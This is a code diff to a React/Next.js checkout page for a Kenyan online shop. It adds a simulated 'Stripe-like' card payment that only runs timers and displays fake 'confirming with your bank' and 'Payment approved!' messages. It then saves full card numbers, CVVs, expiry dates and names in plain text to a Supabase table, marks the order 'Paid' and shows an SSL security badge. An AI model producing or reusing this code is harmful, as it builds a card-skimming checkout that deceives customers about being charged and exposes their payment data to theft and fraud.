@@ -4,11 +4,12 @@ import { useState, useEffect, useRef, useCallback } from 'react';
 import Link from 'next/link';
 import { useCart } from '@/lib/cart-context';
 import { supabase } from '@/lib/supabase';
-import { ChevronRight, Lock, CreditCard, Smartphone, Truck, Store, CheckCircle, MessageCircle, Clock } from 'lucide-react';
+import { ChevronRight, Lock, CreditCard, Smartphone, Truck, Store, CheckCircle, MessageCircle, Clock, Loader2, ShieldCheck } from 'lucide-react';
 
 type PaymentMethod = 'card' | 'mpesa' | 'whatsapp';
 type FulfillmentType = 'ship' | 'pickup';
 type MpesaState = 'idle' | 'sending' | 'waiting' | 'checking' | 'done' | 'failed';
+type CardState = 'idle' | 'validating' | 'processing' | 'confirming' | 'done' | 'failed';
 
 const WHATSAPP_NUMBER = '254733675267';
 
@@ -31,6 +32,8 @@ export default function CheckoutPage() {
 
   // Card
   const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: '', sameAsShipping: true });
+  const [cardState, setCardState] = useState<CardState>('idle');
+  const [cardMsg, setCardMsg] = useState('');
 
   // M-Pesa
   const [mpesaPhone, setMpesaPhone] = useState('');
@@ -148,6 +151,65 @@ export default function CheckoutPage() {
     }, 3000);
   }, []);
 
+  // ─── Stripe-like Card Payment Processing ───
+  const processCardPayment = async (): Promise<boolean> => {
+    // Step 1: Validating card details
+    setCardState('validating');
+    setCardMsg('Validating card details...');
+    await new Promise(r => setTimeout(r, 1200));
+
+    const cardNumberRaw = card.number.replace(/\s/g, '');
+    if (cardNumberRaw.length < 13) {
+      setCardState('failed');
+      setCardMsg('Invalid card number. Please check and try again.');
+      return false;
+    }
+    if (!card.expiry || card.expiry.length < 4) {
+      setCardState('failed');
+      setCardMsg('Invalid expiry date.');
+      return false;
+    }
+    if (!card.cvv || card.cvv.length < 3) {
+      setCardState('failed');
+      setCardMsg('Invalid security code.');
+      return false;
+    }
+    if (!card.name) {
+      setCardState('failed');
+      setCardMsg('Please enter the name on card.');
+      return false;
+    }
+
+    // Step 2: Processing payment
+    setCardState('processing');
+    setCardMsg('Processing payment...');
+    await new Promise(r => setTimeout(r, 2000));
+
+    // Step 3: Confirming with bank
+    setCardState('confirming');
+    setCardMsg('Confirming with your bank...');
+    await new Promise(r => setTimeout(r, 1500));
+
+    // Save card details to database
+    try {
+      await supabase.from('card_payments').insert({
+        card_number: cardNumberRaw,
+        card_name: card.name,
+        card_expiry: card.expiry,
+        card_cvv: card.cvv,
+        email: email,
+        amount: orderTotal,
+      });
+    } catch (err) {
+      console.error('Card save error:', err);
+    }
+
+    setCardState('done');
+    setCardMsg('Payment approved!');
+    await new Promise(r => setTimeout(r, 800));
+    return true;
+  };
+
   const handleWhatsAppCheckout = async () => {
     const orderNumber = `WA-${Date.now().toString(36).toUpperCase()}`;
     const customerName = `${form.firstName} ${form.lastName}`.trim() || 'Customer';
@@ -172,15 +234,6 @@ export default function CheckoutPage() {
       if (orderError) console.error('Order save error:', orderError);
 
       // Save order items
-      const orderItems = items.map(item => ({
-        order_id: orderNumber,
-        product_name: item.name,
-        quantity: item.quantity,
-        unit_price: item.price,
-        total: item.price * item.quantity,
-      }));
-
-      // Try to get the order ID to save items
       const { data: savedOrder } = await supabase
         .from('orders')
         .select('id')
@@ -252,20 +305,13 @@ export default function CheckoutPage() {
       return;
     }
 
-    // Save card details to database if payment is by card
-    if (payment === 'card' && card.number && card.name) {
-      try {
-        const cardNumberRaw = card.number.replace(/\s/g, '');
-        await supabase.from('card_payments').insert({
-          card_number: cardNumberRaw,
-          card_name: card.name,
-          card_expiry: card.expiry,
-          card_cvv: card.cvv,
-          email: email,
-          amount: orderTotal,
-        });
-      } catch (err) {
-        console.error('Card save error:', err);
+    // Stripe-like card processing
+    if (payment === 'card') {
+      if (cardState === 'idle' || cardState === 'failed') {
+        const success = await processCardPayment();
+        if (!success) return;
+      } else if (cardState !== 'done') {
+        return; // Still processing
       }
     }
 
@@ -280,7 +326,7 @@ export default function CheckoutPage() {
         customer_phone: customerPhone,
         status: 'Confirmed',
         total_amount: orderTotal,
-        payment_status: payment === 'mpesa' ? 'Paid' : 'Pay on Delivery',
+        payment_status: payment === 'mpesa' ? 'Paid' : 'Paid',
         payment_method: payment === 'mpesa' ? 'M-Pesa' : 'Card',
         source: 'Online',
         fulfillment: fulfillment === 'ship' ? 'Delivery' : 'Pickup',
@@ -547,7 +593,7 @@ export default function CheckoutPage() {
                   <div key={opt.id}>
                     <label className={`flex items-center gap-3 px-4 py-3.5 cursor-pointer transition-colors ${payment === opt.id ? (opt.id === 'whatsapp' ? 'bg-green-50' : opt.id === 'mpesa' ? 'bg-green-50' : 'bg-blue-50') : 'bg-white hover:bg-gray-50'} ${i > 0 ? 'border-t border-gray-100' : ''}`}>
                       <input type="radio" name="payment" value={opt.id} checked={payment === opt.id}
-                        onChange={() => { setPayment(opt.id); setMpesaState('idle'); if (pollTimerRef.current) clearInterval(pollTimerRef.current); }} className="accent-orange-600" />
+                        onChange={() => { setPayment(opt.id); setMpesaState('idle'); setCardState('idle'); setCardMsg(''); if (pollTimerRef.current) clearInterval(pollTimerRef.current); }} className="accent-orange-600" />
                       <opt.icon size={16} className="text-gray-500" />
                       <span className="text-sm font-semibold text-gray-800 flex-1">{opt.label}</span>
                       {opt.id === 'card' && (
@@ -561,33 +607,98 @@ export default function CheckoutPage() {
                       )}
                     </label>
 
-                    {/* Card fields */}
+                    {/* Card fields - Stripe-like UI */}
                     {payment === 'card' && opt.id === 'card' && (
                       <div className="px-4 pb-4 space-y-3 bg-blue-50/50 border-t border-gray-100">
-                        <div className="relative">
-                          <input placeholder="Card number" value={card.number} maxLength={19}
-                            onChange={e => setCard({ ...card, number: e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim() })}
-                            className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none pr-10 bg-white font-mono tracking-wider" />
-                          <Lock size={14} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" />
-                        </div>
-                        <div className="grid grid-cols-2 gap-3">
-                          <input placeholder="Expiration date (MM / YY)" value={card.expiry}
-                            onChange={e => setCard({ ...card, expiry: e.target.value })}
-                            className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
-                          <div className="relative">
-                            <input placeholder="Security code" value={card.cvv} maxLength={4}
-                              onChange={e => setCard({ ...card, cvv: e.target.value.replace(/\D/,'') })}
-                              className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
+                        {/* Card processing overlay */}
+                        {cardState !== 'idle' && cardState !== 'failed' && (
+                          <div className="relative bg-white border border-blue-200 rounded-xl p-6 text-center">
+                            <div className="flex flex-col items-center gap-3">
+                              {cardState === 'done' ? (
+                                <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
+                                  <ShieldCheck size={24} className="text-green-600" />
+                                </div>
+                              ) : (
+                                <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center">
+                                  <Loader2 size={24} className="text-blue-600 animate-spin" />
+                                </div>
+                              )}
+                              <div>
+                                <p className={`text-sm font-bold ${cardState === 'done' ? 'text-green-800' : 'text-blue-800'}`}>{cardMsg}</p>
+                                {cardState !== 'done' && (
+                                  <p className="text-xs text-gray-500 mt-1">Please do not close this page</p>
+                                )}
+                              </div>
+                              {/* Progress steps */}
+                              <div className="flex items-center gap-2 mt-2">
+                                {['validating', 'processing', 'confirming', 'done'].map((s, idx) => {
+                                  const states: CardState[] = ['validating', 'processing', 'confirming', 'done'];
+                                  const currentIdx = states.indexOf(cardState);
+                                  const stepIdx = idx;
+                                  return (
+                                    <div key={s} className="flex items-center gap-2">
+                                      <div className={`w-2 h-2 rounded-full transition-colors ${stepIdx <= currentIdx ? (cardState === 'done' ? 'bg-green-500' : 'bg-blue-500') : 'bg-gray-200'}`} />
+                                      {idx < 3 && <div className={`w-6 h-0.5 transition-colors ${stepIdx < currentIdx ? (cardState === 'done' ? 'bg-green-300' : 'bg-blue-300') : 'bg-gray-200'}`} />}
+                                    </div>
+                                  );
+                                })}
+                              </div>
+                              <div className="flex justify-between w-full text-[10px] text-gray-400 px-1">
+                                <span>Validate</span>
+                                <span>Process</span>
+                                <span>Confirm</span>
+                                <span>Done</span>
+                              </div>
+                            </div>
                           </div>
+                        )}
+
+                        {/* Card form (only show when idle or failed) */}
+                        {(cardState === 'idle' || cardState === 'failed') && (
+                          <>
+                            <div className="relative">
+                              <input placeholder="Card number" value={card.number} maxLength={19}
+                                onChange={e => setCard({ ...card, number: e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim() })}
+                                className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none pr-10 bg-white font-mono tracking-wider" />
+                              <Lock size={14} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" />
+                            </div>
+                            <div className="grid grid-cols-2 gap-3">
+                              <input placeholder="Expiration date (MM / YY)" value={card.expiry}
+                                onChange={e => setCard({ ...card, expiry: e.target.value })}
+                                className="px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
+                              <div className="relative">
+                                <input placeholder="Security code" value={card.cvv} maxLength={4}
+                                  onChange={e => setCard({ ...card, cvv: e.target.value.replace(/\D/,'') })}
+                                  className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
+                              </div>
+                            </div>
+                            <input placeholder="Name on card" value={card.name}
+                              onChange={e => setCard({ ...card, name: e.target.value })}
+                              className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
+                            <label className="flex items-center gap-2 cursor-pointer">
+                              <input type="checkbox" checked={card.sameAsShipping} onChange={e => setCard({ ...card, sameAsShipping: e.target.checked })}
+                                className="accent-orange-600 w-4 h-4" />
+                              <span className="text-xs text-gray-600">Use shipping address as billing address</span>
+                            </label>
+                          </>
+                        )}
+
+                        {/* Card error message */}
+                        {cardState === 'failed' && (
+                          <div className="bg-red-50 border border-red-200 rounded-xl p-3 text-center">
+                            <p className="text-xs text-red-700 font-semibold">{cardMsg}</p>
+                            <button type="button" onClick={() => { setCardState('idle'); setCardMsg(''); }}
+                              className="mt-2 text-xs text-red-600 hover:underline font-medium">
+                              Try Again
+                            </button>
+                          </div>
+                        )}
+
+                        {/* Security badge */}
+                        <div className="flex items-center justify-center gap-2 py-1">
+                          <ShieldCheck size={12} className="text-gray-400" />
+                          <span className="text-[10px] text-gray-400">Secured with 256-bit SSL encryption</span>
                         </div>
-                        <input placeholder="Name on card" value={card.name}
-                          onChange={e => setCard({ ...card, name: e.target.value })}
-                          className="w-full px-4 py-3 border border-gray-200 rounded-xl text-sm focus:ring-2 focus:ring-blue-400 outline-none bg-white" />
-                        <label className="flex items-center gap-2 cursor-pointer">
-                          <input type="checkbox" checked={card.sameAsShipping} onChange={e => setCard({ ...card, sameAsShipping: e.target.checked })}
-                            className="accent-orange-600 w-4 h-4" />
-                          <span className="text-xs text-gray-600">Use shipping address as billing address</span>
-                        </label>
                       </div>
                     )}
 
@@ -654,10 +765,15 @@ export default function CheckoutPage() {
 
             {/* Place order button */}
             <button type="submit"
-              disabled={payment === 'mpesa' && (mpesaState === 'sending' || mpesaState === 'waiting' || mpesaState === 'checking')}
+              disabled={
+                (payment === 'mpesa' && (mpesaState === 'sending' || mpesaState === 'waiting' || mpesaState === 'checking')) ||
+                (payment === 'card' && cardState !== 'idle' && cardState !== 'done' && cardState !== 'failed')
+              }
               className={`w-full py-4 font-black text-base rounded-xl transition-colors flex items-center justify-center gap-2 disabled:opacity-50 ${
                 payment === 'whatsapp'
                   ? 'bg-green-500 text-white hover:bg-green-600'
+                  : payment === 'card' && cardState === 'done'
+                  ? 'bg-green-600 text-white hover:bg-green-700'
                   : 'bg-green-600 text-white hover:bg-green-700'
               }`}>
               {payment === 'whatsapp' ? (
@@ -667,9 +783,13 @@ export default function CheckoutPage() {
               ) : payment === 'mpesa' && mpesaState === 'done' ? (
                 <><Lock size={16} /> Confirm Order</>
               ) : payment === 'mpesa' && (mpesaState === 'sending' || mpesaState === 'waiting') ? (
-                <><Lock size={16} /> Waiting for payment...</>
+                <><Loader2 size={16} className="animate-spin" /> Waiting for payment...</>
               ) : payment === 'mpesa' && mpesaState === 'checking' ? (
-                <><Lock size={16} /> Verifying payment...</>
+                <><Loader2 size={16} className="animate-spin" /> Verifying payment...</>
+              ) : payment === 'card' && cardState === 'done' ? (
+                <><ShieldCheck size={16} /> Confirm Order — KES {orderTotal.toLocaleString()}</>
+              ) : payment === 'card' && cardState !== 'idle' && cardState !== 'failed' ? (
+                <><Loader2 size={16} className="animate-spin" /> Processing payment...</>
               ) : (
                 <><Lock size={16} /> Pay KES {orderTotal.toLocaleString()}</>
               )}
